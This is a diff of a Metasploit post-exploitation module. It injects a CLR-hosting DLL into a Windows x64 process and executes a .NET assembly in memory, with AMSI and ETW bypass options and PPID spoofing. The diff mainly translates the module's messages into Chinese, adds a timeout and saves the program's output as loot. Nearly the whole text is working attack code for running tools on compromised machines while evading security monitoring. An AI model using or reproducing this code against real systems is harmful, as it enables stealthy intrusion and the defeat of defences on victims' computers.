@@ -1,3 +1,5 @@
+# -*- coding: UTF-8 -*-
+
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -17,15 +19,13 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => 'Execute .net Assembly (x64 only)',
+        'Name' => '内存中执行.net程序 (windows x64环境)',
         'Description' => %q{
-          This module executes a .net assembly in memory. It
-          reflectively loads a dll that will host CLR, then it copies
-          the assembly to be executed into memory. Credits for Amsi
-          bypass to Rastamouse (@_RastaMouse)
+          本模块在内存中执行.net程序，使用反射注入DLL的方式运行，可以绕过AMSI/ETW。
+          Credits for Amsi bypass to Rastamouse (@_RastaMouse)
         },
         'License' => MSF_LICENSE,
-        'Author' => 'b4rtik',
+        'Author' => ['b4rtik','3ricK5r'],
         'Arch' => [ARCH_X64],
         'Platform' => 'win',
         'SessionTypes' => ['meterpreter'],
@@ -36,21 +36,22 @@ class MetasploitModule < Msf::Post
     )
     register_options(
       [
-        OptPath.new('DOTNET_EXE', [true, 'Assembly file name']),
-        OptString.new('ARGUMENTS', [false, 'Command line arguments']),
-        OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe']),
-        OptString.new('USETHREADTOKEN', [false, 'Spawn process with thread impersonation', true]),
-        OptInt.new('PID', [false, 'Pid  to inject', 0]),
-        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
+        OptPath.new('DOTNET_EXE', [true, '.net程序路径']),
+        OptString.new('ARGUMENTS', [false, '命令行参数（必须为字符串）']),
+        OptString.new('PROCESS', [false, '准备启动的进程名称', 'notepad.exe']),
+        OptString.new('USETHREADTOKEN', [false, '使用线程模拟生成进程', true]),
+        OptInt.new('PID', [false, '注入到的Pid', 0]),
+        OptInt.new('PPID', [false, '创建新进程时用于 PPID spoofing 的进程标识符。 (0 = no PPID spoofing)', 0]),
         OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
         OptBool.new('ETWBYPASS', [true, 'Enable Etw bypass', true]),
-        OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
+        OptInt.new('WAIT', [false, '进程运行后等待其执行的时间（单位：秒）', 10]),
+        OptInt.new('TIMEOUT', [false, '等待返回结果的超时时间（单位：秒）', 600])
       ], self.class
     )
 
     register_advanced_options(
       [
-        OptBool.new('KILL', [true, 'Kill the injected process at the end of the task', false])
+        OptBool.new('KILL', [true, '任务结束之后关闭进程', false])
       ]
     )
   end
@@ -63,44 +64,55 @@ class MetasploitModule < Msf::Post
         break if subitem.to_s(16) != filecontent[index + indexsub].to_s(16)
 
         if indexsub == 9
-          vprint_status('CLR version required: v4.0.30319')
+          vprint_status('信息：需要的.net framework版本：v4.0.30319')
           return 'v4.0.30319'
         end
       end
     end
-    vprint_status('CLR version required: v2.0.50727')
+    vprint_status('信息：需要的.net framework版本：v2.0.50727')
     'v2.0.50727'
   end
 
   def check_requirements(clr_req, installed_dotnet_versions)
     installed_dotnet_versions.each do |fi|
-      if clr_req == 'v4.0.30319'
-        if fi[0] == '4'
-          vprint_status('Requirements ok')
-          return true
-        end
-      elsif fi[0] == '3'
-        vprint_status('Requirements ok')
+      # if clr_req == 'v4.0.30319'
+      #   if fi[0] == '4'
+      #     vprint_status('Requirements ok')
+      #     return true
+      #   end
+      # elsif fi[0] == '3'
+      #   vprint_status('Requirements ok')
+      #   return true
+      # end
+      if clr_req[1] == fi[0]
+        vprint_status('信息：.net framework版本匹配成功')
         return true
       end
     end
-    print_error('Required dotnet version not present')
+    print_error('错误：没有找到合适的.net framework版本！')
     false
   end
 
   def run
     exe_path = datastore['DOTNET_EXE']
     unless File.file?(exe_path)
-      fail_with(Failure::BadConfig, 'Assembly not found')
+      fail_with(Failure::BadConfig, '错误：没有找到.net运行程序（DOTNET_EXE）！')
     end
+    
+    if not (client.platform == 'windows' && client.arch == ARCH_X64)
+      print_error("错误：客户机运行的payload必须是windows x64！当前客户机运行的payload是：#{client.platform} #{client.arch}")
+      print_status('信息：如果使用32位的payload，请执行migrate迁移到64位的程序（比如：explorer.exe）')
+      fail_with(Failure::BadConfig, '')
+    end
+
     installed_dotnet_versions = get_dotnet_versions
-    vprint_status("Dot Net Versions installed on target: #{installed_dotnet_versions}")
+    vprint_status("信息：客户机安装的.net framework版本：#{installed_dotnet_versions}")
     if installed_dotnet_versions == []
-      fail_with(Failure::BadConfig, 'Target has no .NET framework installed')
+      fail_with(Failure::BadConfig, '错误：客户机没有安装.net framework环境！')
     end
     rclr = find_required_clr(exe_path)
     if check_requirements(rclr, installed_dotnet_versions) == false
-      fail_with(Failure::BadConfig, 'CLR required for assembly not installed')
+      fail_with(Failure::BadConfig, '错误：客户机没有安装的需要的.net framework版本！')
     end
     execute_assembly(exe_path)
   end
@@ -118,13 +130,13 @@ class MetasploitModule < Msf::Post
     mypid = client.sys.process.getpid.to_i
 
     if pid == mypid
-      print_bad('Cannot select the current process as the injection target')
+      print_bad('错误：您不能选择当前进程作为注入目标进程！')
       return false
     end
 
     host_processes = client.sys.process.get_processes
     if host_processes.empty?
-      print_bad('No running processes found on the target host.')
+      print_bad('错误：客户机上没有找到运行的目标进程！')
       return false
     end
 
@@ -135,13 +147,13 @@ class MetasploitModule < Msf::Post
 
   def launch_process
     if (datastore['PPID'] != 0) && !pid_exists(datastore['PPID'])
-      print_error("Process #{datastore['PPID']} was not found")
+      print_error("错误：进程 #{datastore['PPID']} 没找到！")
       return false
     elsif datastore['PPID'] != 0
-      print_status("Spoofing PPID #{datastore['PPID']}")
+      print_status("信息：Spoofing PPID #{datastore['PPID']}")
     end
     process_name = sanitize_process_name(datastore['PROCESS'])
-    print_status("Launching #{process_name} to host CLR...")
+    print_status("信息：运行进程 #{process_name} ...")
     channelized = true
     channelized = false if datastore['PID'].positive?
 
@@ -155,17 +167,17 @@ class MetasploitModule < Msf::Post
       'ParentPid' => datastore['PPID']
     })
     hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
-    print_good("Process #{hprocess.pid} launched.")
+    print_good("步骤：进程 #{hprocess.pid} 启动完成")
     [process, hprocess]
   end
 
   def inject_hostclr_dll(process)
-    print_status("Reflectively injecting the Host DLL into #{process.pid}..")
+    print_status("信息：准备反射注入DLL到进程 #{process.pid} 中...")
 
     library_path = ::File.join(Msf::Config.data_directory, 'post', 'execute-dotnet-assembly', 'HostingCLRx64.dll')
     library_path = ::File.expand_path(library_path)
 
-    print_status("Injecting Host into #{process.pid}...")
+    print_status("信息：正在注入进程 #{process.pid}...")
     exploit_mem, offset = inject_dll_into_process(process, library_path)
     [exploit_mem, offset]
   end
@@ -174,28 +186,28 @@ class MetasploitModule < Msf::Post
     pid = datastore['PID'].to_i
 
     if pid_exists(pid)
-      print_status("Opening handle to process #{datastore['PID']}...")
+      print_status("信息：打开进程 #{datastore['PID']} 的句柄...")
       hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
-      print_good('Handle opened')
+      print_good('步骤：句柄已经打开')
       [nil, hprocess]
     else
-      print_bad('Pid not found')
+      print_bad("错误：未找到进程 Pid：#{datastore['PID']}")
       [nil, nil]
     end
   end
 
   def execute_assembly(exe_path)
     if sysinfo.nil?
-      fail_with(Failure::BadConfig, 'Session invalid')
+      fail_with(Failure::BadConfig, '错误：无效Session！')
     else
-      print_status("Running module against #{sysinfo['Computer']}")
+      print_status("信息：在客户机 #{sysinfo['Computer']} 上运行模块")
     end
     if datastore['PID'].positive? || datastore['WAIT'].zero? || datastore['PPID'].positive?
-      print_warning('Output unavailable')
+      print_warning('错误：无效输出！')
     end
 
     if (datastore['PPID'] != 0) && (datastore['PID'] != 0)
-      print_error('PID and PPID are mutually exclusive')
+      print_error('错误：PID 和 PPID 是互不相容的！')
       return false
     end
 
@@ -204,11 +216,12 @@ class MetasploitModule < Msf::Post
     else
       process, hprocess = open_process
     end
+
     exploit_mem, offset = inject_hostclr_dll(hprocess)
 
     assembly_mem = copy_assembly(exe_path, hprocess)
 
-    print_status('Executing...')
+    print_status('信息：执行中...')
     hprocess.thread.create(exploit_mem + offset, assembly_mem)
 
     sleep(datastore['WAIT']) if datastore['WAIT'].positive?
@@ -218,15 +231,15 @@ class MetasploitModule < Msf::Post
     end
 
     if datastore['KILL']
-      print_good("Killing process #{hprocess.pid}")
+      print_good("步骤：关闭进程 #{hprocess.pid}")
       client.sys.process.kill(hprocess.pid)
     end
 
-    print_good('Execution finished.')
+    print_good('步骤：执行结束')
   end
 
   def copy_assembly(exe_path, process)
-    print_status("Host injected. Copy assembly into #{process.pid}...")
+    print_status("信息：注入完成，下面将.net程序拷贝到进程 #{process.pid} 中...")
     int_param_size = 8
     amsi_flag_size = 1
     etw_flag_size = 1
@@ -259,30 +272,40 @@ class MetasploitModule < Msf::Post
     params += "\x00"
 
     process.memory.write(assembly_mem, params + File.read(exe_path))
-    print_status('Assembly copied.')
+    print_good('步骤：.net程序拷贝完成')
     assembly_mem
   end
 
   def read_output(process)
-    print_status('Start reading output')
+    print_status('信息：开始读取.net程序运行输出信息')
     old_timeout = client.response_timeout
-    client.response_timeout = 5
+    client.response_timeout = datastore['TIMEOUT'] if datastore['TIMEOUT'].positive?
 
+    outputs = ""
     begin
       loop do
         output = process.channel.read
         if !output.nil? && !output.empty?
-          output.split("\n").each { |x| print_good(x) }
+          output.split("\n").each { |x| 
+            print_good(x.force_encoding("GBK").encode("UTF-8"))
+            outputs << x.force_encoding("GBK").encode("UTF-8") << "\n"
+          }
         end
-        break if output.nil? || output.empty?
+        next if output.nil? || output.empty?
+        break if output.include? 'Execute Assembly Succeeded' or output.include? 'Failed pMethodInfo->Invoke_3'
       end
     rescue Rex::TimeoutError => e
-      vprint_warning('Time out exception: wait limit exceeded (5 sec)')
+      vprint_warning("异常：读取输出信息，空闲时间超时#{client.response_timeout}秒")
     rescue ::StandardError => e
-      print_error("Exception: #{e.inspect}")
+      print_error("异常：#{e.inspect}")
     end
 
     client.response_timeout = old_timeout
-    print_status('End output.')
+    print_status('信息：读取输出信息结束')
+
+    if outputs != ""
+      path = store_loot("dotnet.assembly.output", "text/plain", session, outputs, "dotnet.assembly.output.txt", "dotnet assembly output Data")
+      print_good("步骤：输出信息保存文件：#{path}")
+    end
   end
 end
